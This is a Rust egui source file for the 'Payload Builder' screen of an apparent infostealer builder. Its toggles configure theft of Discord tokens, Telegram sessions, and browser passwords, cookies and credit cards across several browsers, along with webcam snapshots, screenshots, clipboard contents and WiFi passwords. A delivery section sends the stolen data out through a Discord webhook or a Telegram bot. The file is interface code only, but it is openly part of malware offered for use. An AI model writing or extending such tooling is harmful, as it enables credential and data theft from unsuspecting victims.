use egui::{Color32, CornerRadius, Stroke};
use crate::state::AppState;
use crate::theme::ZedTheme;
use crate::ui::widgets::{section_card, toggle_row, styled_input};

pub fn draw_builder(ui: &mut egui::Ui, ctx: &egui::Context, state: &mut AppState) {
    egui::ScrollArea::vertical()
        .auto_shrink([false; 2])
        .show(ui, |ui| {
            ui.add_space(20.0);

            page_header(ui, "Payload Builder", "Configure what data the payload will collect");

            ui.add_space(20.0);

            // avail_w must be sampled INSIDE the ScrollArea
            let avail_w = ui.available_width();
            let gap     = 12.0_f32;
            let col_w   = ((avail_w - gap - 24.0) / 2.0).max(1.0);

            ui.horizontal_top(|ui| {
                ui.spacing_mut().item_spacing.x = 0.0;
                ui.add_space(12.0);

                // ── Left column ───────────────────────────────────────────────
                ui.vertical(|ui| {
                    ui.set_width(col_w);

                    section_card(ui, "Discord", |ui| {
                        toggle_row(ui, ctx, "dc_tok",   "Token Stealer",  Some("Grabs all Discord user tokens"),   &mut state.features.discord_tokens);
                        toggle_row(ui, ctx, "dc_nit",   "Nitro Checker",  Some("Check if tokens have Nitro"),      &mut state.features.discord_nitro_check);
                        toggle_row(ui, ctx, "dc_fri",   "Friends List",   Some("Export friends list via API"),     &mut state.features.discord_friends);
                    });

                    ui.add_space(10.0);

                    section_card(ui, "Telegram", |ui| {
                        toggle_row(ui, ctx, "tg_ses", "Session Files", Some("Grab tdata session folder"), &mut state.features.telegram_sessions);
                    });

                    ui.add_space(10.0);

                    section_card(ui, "Browsers", |ui| {
                        toggle_row(ui, ctx, "br_coo", "Cookies",       Some("All saved cookies"),           &mut state.features.browser_cookies);
                        toggle_row(ui, ctx, "br_pas", "Passwords",     Some("Saved login credentials"),     &mut state.features.browser_passwords);
                        toggle_row(ui, ctx, "br_his", "History",       Some("Browsing history"),            &mut state.features.browser_history);
                        toggle_row(ui, ctx, "br_car", "Credit Cards",  Some("Saved payment cards"),         &mut state.features.browser_cards);
                        toggle_row(ui, ctx, "br_aut", "Autofill",      Some("Autofill form data"),          &mut state.features.browser_autofill);

                        ui.add_space(10.0);
                        ui.label(egui::RichText::new("  Target Browsers").color(ZedTheme::TEXT_DIM).size(11.0));
                        ui.add_space(6.0);
                        browser_targets(ui, ctx, state);
                    });
                });

                ui.add_space(gap);

                // ── Right column ──────────────────────────────────────────────
                ui.vertical(|ui| {
                    ui.set_width(col_w);

                    section_card(ui, "System Information", |ui| {
                        toggle_row(ui, ctx, "sy_inf", "OS Info",        Some("OS version, hostname, user"),   &mut state.features.system_info);
                        toggle_row(ui, ctx, "sy_hw",  "Hardware",       Some("CPU, GPU, RAM, Disk"),          &mut state.features.hardware_info);
                        toggle_row(ui, ctx, "sy_net", "Network",        Some("IP, ISP, Country, City"),       &mut state.features.network_info);
                        toggle_row(ui, ctx, "sy_ss",  "Screenshot",     Some("Capture all monitors"),         &mut state.features.screenshot);
                        toggle_row(ui, ctx, "sy_cam", "Webcam Capture", Some("Front camera snapshot"),        &mut state.features.webcam);
                    });

                    ui.add_space(10.0);

                    section_card(ui, "Additional", |ui| {
                        toggle_row(ui, ctx, "ms_cli", "Clipboard",      Some("Clipboard text content"),       &mut state.features.clipboard);
                        toggle_row(ui, ctx, "ms_wif", "WiFi Passwords", Some("Saved WiFi credentials"),       &mut state.features.wifi_passwords);
                        toggle_row(ui, ctx, "ms_app", "Installed Apps", Some("List of installed programs"),   &mut state.features.installed_apps);
                        toggle_row(ui, ctx, "ms_str", "Startup Files",  Some("Files set to autorun"),         &mut state.features.startup_files);
                    });

                    ui.add_space(10.0);

                    section_card(ui, "Delivery", |ui| {
                        toggle_row(ui, ctx, "dl_dc", "Discord Webhook", None, &mut state.delivery.use_discord);
                        if state.delivery.use_discord {
                            ui.add_space(6.0);
                            styled_input(ui, "Webhook URL", "https://discord.com/api/webhooks/...", &mut state.delivery.discord_webhook);
                        }

                        ui.add_space(10.0);
                        toggle_row(ui, ctx, "dl_tg", "Telegram Bot", None, &mut state.delivery.use_telegram);
                        if state.delivery.use_telegram {
                            ui.add_space(6.0);
                            styled_input(ui, "Bot Token",  "1234567890:AAF...",   &mut state.delivery.telegram_token);
                            ui.add_space(8.0);
                            styled_input(ui, "Chat ID",    "-100123456789",        &mut state.delivery.telegram_chat_id);
                        }
                    });
                });
            });

            ui.add_space(20.0);
        });
}

fn browser_targets(ui: &mut egui::Ui, ctx: &egui::Context, state: &mut AppState) {
    let browsers: &[(&str, &str)] = &[
        ("Chrome",  "br_ch"),
        ("Firefox", "br_ff"),
        ("Edge",    "br_ed"),
        ("Brave",   "br_br"),
        ("Opera",   "br_op"),
    ];

    let vals = [
        state.features.target_chrome,
        state.features.target_firefox,
        state.features.target_edge,
        state.features.target_brave,
        state.features.target_opera,
    ];

    ui.horizontal_wrapped(|ui| {
        for (idx, (name, id)) in browsers.iter().enumerate() {
            let is_on  = vals[idx];
            let anim_id = ui.id().with(*id);
            let anim   = ctx.animate_bool_with_time(anim_id, is_on, 0.15);

            let text_color = Color32::from_rgb(
                (ZedTheme::TEXT_DIM.r() as f32 + anim * (ZedTheme::PINK.r() as f32 - ZedTheme::TEXT_DIM.r() as f32)) as u8,
                (ZedTheme::TEXT_DIM.g() as f32 + anim * (ZedTheme::PINK.g() as f32 - ZedTheme::TEXT_DIM.g() as f32)) as u8,
                (ZedTheme::TEXT_DIM.b() as f32 + anim * (ZedTheme::PINK.b() as f32 - ZedTheme::TEXT_DIM.b() as f32)) as u8,
            );

            let clicked = ui.add(
                egui::Button::new(egui::RichText::new(*name).color(text_color).size(11.5))
                    .fill(Color32::from_rgba_premultiplied(
                        ZedTheme::PINK.r(), ZedTheme::PINK.g(), ZedTheme::PINK.b(),
                        (anim * 25.0) as u8,
                    ))
                    .stroke(Stroke::new(1.0, Color32::from_rgba_premultiplied(
                        ZedTheme::PINK.r(), ZedTheme::PINK.g(), ZedTheme::PINK.b(),
                        (50.0 + anim * 120.0) as u8,
                    )))
                    .corner_radius(CornerRadius::same(5)),
            ).clicked();

            if clicked {
                match idx {
                    0 => state.features.target_chrome  = !state.features.target_chrome,
                    1 => state.features.target_firefox = !state.features.target_firefox,
                    2 => state.features.target_edge    = !state.features.target_edge,
                    3 => state.features.target_brave   = !state.features.target_brave,
                    4 => state.features.target_opera   = !state.features.target_opera,
                    _ => {}
                }
            }
        }
    });
}

fn page_header(ui: &mut egui::Ui, title: &str, subtitle: &str) {
    ui.horizontal(|ui| {
        ui.add_space(12.0);
        ui.vertical(|ui| {
            ui.label(egui::RichText::new(title).color(ZedTheme::TEXT_BRIGHT).size(20.0).strong());
            ui.label(egui::RichText::new(subtitle).color(ZedTheme::TEXT_DIM).size(11.5));
        });
    });
}
